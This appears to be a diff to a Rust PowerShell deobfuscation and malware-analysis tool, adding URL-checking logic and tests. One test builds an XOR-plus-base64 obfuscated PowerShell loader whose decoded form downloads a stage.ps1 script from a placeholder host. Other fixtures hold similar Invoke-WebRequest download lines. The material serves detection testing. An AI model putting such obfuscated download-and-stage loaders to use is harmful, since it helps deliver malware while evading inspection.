@@ -3885,6 +3885,22 @@ fn normalize_extracted_ps1_payloads(
     normalized
 }
 
+fn normalized_payload_has_url_missing_from_out(payload: &str, out: &str) -> bool {
+    payload
+        .split(|ch: char| {
+            ch.is_whitespace()
+                || matches!(
+                    ch,
+                    '"' | '\'' | '`' | ';' | ',' | '<' | '>' | '(' | ')' | '[' | ']' | '{' | '}'
+                )
+        })
+        .filter(|token| {
+            token.contains("http://") || token.contains("https://") || token.contains("ftp://")
+        })
+        .filter_map(deob_scan::normalize_liberal_url_token)
+        .any(|url| !out.contains(&url))
+}
+
 fn analyze_inner(input: &[u8], cfg: &Config, file_path: Option<std::path::PathBuf>) -> Report {
     let profile_enabled = std::env::var_os("HARRINGTON_PROFILE").is_some();
     let profile_start = std::time::Instant::now();
@@ -4177,7 +4193,10 @@ fn analyze_inner(input: &[u8], cfg: &Config, file_path: Option<std::path::PathBu
         // deob — `Convert::FromBase64String('SGVsbG8=')` style invocations
         // are already rendered by the regular dispatch path.
         let sample: String = first_line.chars().take(60).collect();
-        if sample.len() >= 16 && out.contains(&sample) {
+        if sample.len() >= 16
+            && out.contains(&sample)
+            && !normalized_payload_has_url_missing_from_out(trimmed, &out)
+        {
             continue;
         }
         // Detect the language of the extracted payload so the banner
@@ -15208,6 +15227,45 @@ Unvertically '{blob}' 1"#
     }
 
     #[test]
+    fn inline_ps1_xor_base64_function_surfaces_decoded_payload_in_deob() {
+        use base64::Engine;
+
+        fn encode_xor_b64(value: &str, key: &[u8]) -> String {
+            let encoded: Vec<u8> = value
+                .bytes()
+                .enumerate()
+                .map(|(idx, byte)| byte ^ key[idx % key.len()])
+                .collect();
+            base64::engine::general_purpose::STANDARD.encode(encoded)
+        }
+
+        let key = b"uknkkeliges";
+        let url = "https://ps-inline-xor-visible.example/stage.ps1";
+        let decoded = format!("Invoke-WebRequest -Uri {url}");
+        let blob = encode_xor_b64(&decoded, key);
+        let script = format!(
+            r#"powershell "$omprioriteringen=@(117,107,110,107,107,101,108,105,103,101,115);function Unvertically ($pauver,$execute=0) {{$bytes=[Convert]::FromBase64String($pauver);$out=0..($bytes.Length-1)|%{{ $bytes[$_] -bxor $omprioriteringen[$_%$omprioriteringen.Length] }};[Text.Encoding]::ASCII.GetString($out)}};Unvertically '{blob}' 1""#
+        );
+        let report = analyze(script.as_bytes(), &Config::default());
+
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t,
+                    Trait::Download { src, .. } if src == url
+                )
+            }),
+            "inline xor/base64 URL was not extracted: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
+        );
+        assert!(
+            report.deobfuscated.contains(url),
+            "decoded inline xor/base64 payload was not surfaced in deobfuscated output:\n{}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn powershell_command_payload_preserves_percent_literals_before_ps_scan() {
         let script = r#"powershell -Command "$pad='left%MISSING%right'; Invoke-WebRequest -Uri https://raw-percent-ps.example/stage.ps1""#;
         let report = analyze(script.as_bytes(), &Config::default());
@@ -25216,6 +25274,36 @@ mod ps_alias_tests {
         );
         assert!(
             out.contains("Invoke-WebRequest http://e.example/p"),
+            "command-position alias was not expanded: {}",
+            out
+        );
+    }
+
+    #[test]
+    fn aliases_inside_long_quoted_literals_are_not_expanded() {
+        let input = "$ua = 'Mozilla/5.0 Firefox/150.0 rv:150.0'; rv $ua";
+        let out = expand_aliases(input);
+
+        assert!(
+            out.contains("Firefox/150.0 rv:150.0"),
+            "alias expansion rewrote quoted user-agent text: {}",
+            out
+        );
+        assert!(
+            out.contains("Remove-Variable $ua"),
+            "command-position alias was not expanded: {}",
+            out
+        );
+
+        let unquoted_colon = "$ua = rv:150.0; rv $ua";
+        let out = expand_aliases(unquoted_colon);
+        assert!(
+            out.contains("rv:150.0"),
+            "alias expansion rewrote colon-suffixed token: {}",
+            out
+        );
+        assert!(
+            out.contains("Remove-Variable $ua"),
             "command-position alias was not expanded: {}",
             out
         );
